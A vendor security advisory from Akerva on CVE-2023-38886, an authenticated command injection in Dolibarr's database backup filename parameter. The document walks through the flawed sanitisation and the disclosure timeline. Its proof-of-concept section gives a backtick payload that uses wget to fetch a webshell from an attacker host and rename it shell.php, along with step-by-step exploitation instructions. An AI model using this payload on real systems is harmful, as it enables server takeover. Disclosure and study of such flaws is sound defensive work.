Akerva – Security Advisory – Dolibarr – Remote Code Execution
(Authenticated) CVE-2023-38886

SECURITY ADVISORY

Dolibarr

Remote Code Execution
(Authenticated)

BELABED Skander

16/05/2023

CVE-2023-38886

RENNES – PARIS

Siège social - 37 Boulevard Solférino - 35000 RENNES

Tel +33(0)1 53 76 86 35  |  E-mail contact@akerva.com

16/05/2023

1

Akerva – Security Advisory – Dolibarr – Remote Code Execution
(Authenticated) CVE-2023-38886

Table of contents

SUMMARY .......................................................................................................................................................................................... 3
Context .................................................................................................................................................................. 3
Description .......................................................................................................................................................... 3
Products and versions affected ............................................................................................................. 3
Impact .................................................................................................................................................................... 3
Mitigations ........................................................................................................................................................... 3
Disclosure timeline ........................................................................................................................................ 3
TECHNICAL DETAILS .......................................................................................................................................................................4
Vulnerability Details ...................................................................................................................................... 4
Proof of Concept (PoC) ................................................................................................................................ 8
Risk Characterization .................................................................................................................................... 9
References ........................................................................................................................................................... 9
ABOUT AKERVA ............................................................................................................................................................................. 10
Who are we? .................................................................................................................................................... 10
Join us .................................................................................................................................................................. 10
Contact ................................................................................................................................................................ 10

16/05/2023

2

Akerva – Security Advisory – Dolibarr – Remote Code Execution
(Authenticated) CVE-2023-38886

SUMMARY
Context

Product description:

Dolibarr ERP CRM is an open source, free software package for companies of any
size, foundations, or freelancers. It includes different features for enterprise
resource planning (ERP) and customer relationship management (CRM) but also
other features for different activities.

Description

The « filename_template » parameter used in the database backup functionality is not
properly sanitized, thus allowing an authenticated administrator to execute arbitrary
commands.

Products and versions affected

Affected products:

•  Dolibarr 17.0.1 and earlier

Impact

Any authenticated user with administrative rights can execute commands on the hosting
server.

Mitigations

Upgrade to the latest version of the product.

Disclosure timeline

DATE

16/05/2023

07/07/2023

21/07/2023

18/08/2023

18/09/2023

EVENT

Initial discovery.

Initial contact with security@dolibarr.org

Vulnerability acknowledged by Dolibarr’s team

Fix published by Dolibarr’s team

Public disclosure

16/05/2023

3

Akerva – Security Advisory – Dolibarr – Remote Code Execution
(Authenticated) CVE-2023-38886

TECHNICAL DETAILS

Vulnerability Details

One of the features available in “Admin Tools > Backup” is the database backup, which, in
summary, lets the administrator perform a database backup and export it as a file.

FIGURE 1: BACKUP PAGE PRESENT IN THE ADMIN TOOLS SECTION.

The user can modify the behavior of the backup process through some parameters, the
interesting ones being:

1.  Export method: can be a dump using the mysqldump binary or using some PHP

functions.

2.  Use a low memory mode:  option that can be selected when we use the

mysqldump mode to use an external pipe instead of retrieving the dump content
in PHP memory.

3.  Filename for backup:  the output file name.

16/05/2023

4

Akerva – Security Advisory – Dolibarr – Remote Code Execution
(Authenticated) CVE-2023-38886

FIGURE 2: DATABASE BACKUP INTERESTING OPTIONS.

16/05/2023

5

Akerva – Security Advisory – Dolibarr – Remote Code Execution
(Authenticated) CVE-2023-38886

Analyzing the backup process done inside the dumpDatabase function which can be
found in htdocs/core/class.utils.class.php, we can see that at some point, the given file
name (a string which is controlled by the user) is appended to the final command string
intended to be passed to the exec function (for the sake of clearness, the following code
has been truncated):

FIGURE 3: DUMPDATABASE FUNCTION DEFINITION.

FIGURE 4: TRUNCATED CODE OF CORE/CLASS/UTILS.CLASS.PHP (1).

Before each assignment/concatenation, security checks are done to avoid the exploitation
of several vulnerabilities such as Directory Traversal or Command Injection. These checks
are performed respectively inside dol_sanitizeFileName and dol_sanitizePathName:

FIGURE 5: TRUNCATED CODE OF CORE/CLASS/UTILS.CLASS.PHP (2).

16/05/2023

6

Akerva – Security Advisory – Dolibarr – Remote Code Execution
(Authenticated) CVE-2023-38886

By analyzing the checks done inside the second function (dol_sanitizePathName), we can
see that the string passed as argument is sanitized in order to remove some “dangerous”
characters which can be used to perform command injections. But as shown below, it is
still possible to bypass the security measure and inject commands by using backticks (``)
for instance:

FIGURE 6: DOL_SANITIZEPATHNAME PRESENT IN CORE/LIB/FUNCTIONS.LIB.PHP.

16/05/2023

7

Akerva – Security Advisory – Dolibarr – Remote Code Execution
(Authenticated) CVE-2023-38886

Proof of Concept (PoC)

Since some of the mandatory characters to get a reverse shell are filtered (ie: - | $ /), we can
use the following simple payload to remotely download on the targeted server a webshell
hosted by the attacker which after can be used to perform any command execution:

FIGURE 7: PAYLOAD WHICH GET THE WEBSHELL FROM THE ATTACKER WEBSERVER AS
INDEX.HTML AND RENAME IT TO SHELL.PHP.

  So here are the exploitation steps:

1.  Add a new file named index.html and put inside it our webshell.
2.  Expose the newly created file on the root folder of a web server.
3.  Go to the backup feature on Dolibarr and select the “mysqldump” export method.
4.  Select the “lowmemorydump” method to hit the vulnerable section.
5.  Put the payload as the export file name (ie: `wget 192.168.1.167 && mv index.html

shell.php`).

6.  Click on generate backup.

FIGURE 8: EXPLOITATION STEPS.

16/05/2023

8

Akerva – Security Advisory – Dolibarr – Remote Code Execution
(Authenticated) CVE-2023-38886

Once done, we should find our webshell in htdocs/admin/tools/shell.php:

FIGURE 9: UPLOADED WEBSHELL LOCATION.

Risk Characterization

FIGURE 10: CVSS SCORING

Network (N)
Low (L)

CVSS v3.1 – Base Score
Attack Vector (AV)
Attack Complexity (AC)
Privileges Required (PR)  High (H)
None (N)
User Interaction (UI)
CVSS v3.1 – Temporal Score
Exploit Code Maturity
(E)
Remediation Level (RL)
Report Confidence (RC)

High (H)

Not Defined (X)
Confirmed (C)

Scope (S)
Confidentiality (C)
Integrity (I)
Availability (A)

Changed (C)
High (H)
High (H)
High (H)

References

▪  Dolibarr, Wikipedia

https://www.citethisforme.com/cite/sources/websiteautociteeval

16/05/2023

9

Akerva – Security Advisory – Dolibarr – Remote Code Execution
(Authenticated) CVE-2023-38886

ABOUT AKERVA

Who are we?

Founded  in  2013,  Akerva  is  a  consulting  firm  specialized  in  CyberSecurity  and  Risk
Management. Our Offensive Technology team (OffTech) work for our customers to provide
them with security assessments through offensive and technical audits in order to identify
credible real world compromission scenarios and business risk. Missions such as application
or network penetration testing, red team engagements or phishing and social engineering
campaigns are complemented by R&D and vulnerability research in our dedicated lab to
maintain the highest technical proficiency for our team.

Join us

Want to be part of the adventure? Join our team of experts by sending your application:
https://akerva.com/jobs/

Contact

▪  Website: https://akerva.com

▪  Blog: https://akerva.com/blog/

▪  Email: contact@akerva.com

▪  LinkedIn: https://fr.linkedin.com/company/akerva

▪  Twitter: https://twitter.com/Akerva_FR

16/05/2023

10

